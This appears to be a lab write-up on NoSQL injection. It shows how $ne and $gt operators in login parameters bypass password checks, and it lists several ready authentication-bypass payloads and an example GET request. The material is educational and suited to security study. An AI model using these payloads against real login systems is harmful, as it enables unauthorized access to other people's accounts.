
---

# 📖 High-Level Summary:

This lab demonstrates **NoSQL Injection** techniques by exploiting the insecure handling of NoSQL queries. By manipulating query operators such as `$ne` (not equal) or `$gt` (greater than), we bypass authentication mechanisms and gain unauthorized access.

---

# 📚 Definition Bank:

|**Term**|**Definition**|**Key Notes**|
|---|---|---|
|**NoSQL Injection**|A vulnerability that exploits improperly sanitized inputs in NoSQL databases.|Targets the query structure to manipulate logic and bypass authentication.|
|**NoSQL**|A type of database that stores data in a non-relational format, often as documents (e.g., MongoDB).|Commonly used query operators: `$ne` (not equal), `$gt` (greater than), `$lt` (less than).|
|**`$ne` (Not Equal)**|A NoSQL query operator that checks if a value is not equal to another value.|Example: `{"username": {"$ne": null}}` matches any username not equal to `null`.|
|**`$gt` (Greater Than)**|A NoSQL query operator that checks if a value is greater than another value.|Example: `{"password": {"$gt": ""}}` matches passwords greater than an empty string.|

---

# 🎯 Steps and Commands:

### Step 1: Identify the Login Endpoint

1. **Valid Login Attempt**:
    
    - Input:
        - Username: `admin`
        - Password: `admin`
    - **Result:** Successful login.
2. **Invalid Login Attempt**:
    
    - Input:
        - Username: `asdasd`
        - Password: `asdasd`
    - **Result:** Failed login.
3. **Traffic Observation**:
    
    - **GET Request:**
        
        ```plaintext
        GET /login?username=admin&password=asdasd HTTP/1.1
        ```
        

---

### Step 2: Exploiting the Vulnerability

1. **Injection Payload**:
    
    ```plaintext
    GET /login?username=admin&password[$ne]=asdasd
    ```
    
    - **Explanation**:
        - `password[$ne]=asdasd` evaluates to true because `$ne` means "not equal."
        - This bypasses the actual password check since the query now matches any password not equal to `asdasd`.
2. **Other Payload Examples**:
    
    ```json
    {"username": {"$ne": null}, "password": {"$ne": null}}
    {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
    {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
    {"username": {"$gt":""}, "password": {"$gt":""}}
    ```
    

---

### Step 3: Visual Representation of the Payload

#### Original Query (No Injection):

```json
{
  "username": "admin",
  "password": "asdasd"
}
```

- **Expected Behavior**: The application checks if the provided username and password match a valid user.

---

#### Injected Query:

```json
{
  "username": "admin",
  "password": {"$ne": "asdasd"}
}
```

- **Injected Behavior**:
    - The password is evaluated as "not equal to `asdasd`."
    - This bypasses the actual password check, as any password not matching `asdasd` will return true.

---

# 🧐 Why Does the Payload Work?

1. **Understanding `$ne`**:
    
    - `$ne` stands for "not equal."
    - In a NoSQL query, it bypasses the exact match requirement by returning true if the condition is not met.
2. **Query Logic**:
    
    - Original Query:
        
        ```json
        db.users.findOne({ "username": "admin", "password": "asdasd" })
        ```
        
        - Returns true only if both conditions match a database entry.
    - Injected Query:
        
        ```json
        db.users.findOne({ "username": "admin", "password": { "$ne": "asdasd" } })
        ```
        
        - Bypasses the password check because `$ne` returns true for any password not equal to `asdasd`.
3. **Other Payloads**:
    
    - **`$gt` (Greater Than)**:
        - Example:
            
            ```json
            {"username": {"$gt": ""}, "password": {"$gt": ""}}
            ```
            
        - Matches any non-empty string for both `username` and `password`.

In a URL, **square brackets** (`[]`) are used as a way to encode **nested objects** in query strings. They are not exactly the same as curly brackets (`{}`), but they serve a similar purpose in encoding JSON-like structures into URL parameters.

Let me break it down step by step:

---

### **1. Why Square Brackets (`[]`) in URLs?**

When encoding data in a URL query string, you cannot directly use JSON with curly brackets (`{}`). Instead, square brackets (`[]`) are used as a convention to indicate nested structures.

For example:

- Query string:
    
    plaintext
    
    CopyEdit
    
    `password[$ne]=value`
    
    This translates to the following JSON:
    
    json
    
    CopyEdit
    
    `{   "password": {     "$ne": "value"   } }`
    

The **square brackets** signify that `$ne` is part of a sub-object under the key `password`.



---

# ✅ Key Takeaways:

1. **NoSQL Query Operators**:
    - Operators like `$ne` and `$gt` can manipulate query logic, bypassing authentication.
2. **Payload Placement**:
    - Injecting query operators directly into parameters can alter the intended database query behavior.
3. **Fuzzing for Injection**:
    - Tools like **ffuf** with NoSQL-specific wordlists can discover vulnerable endpoints efficiently.

---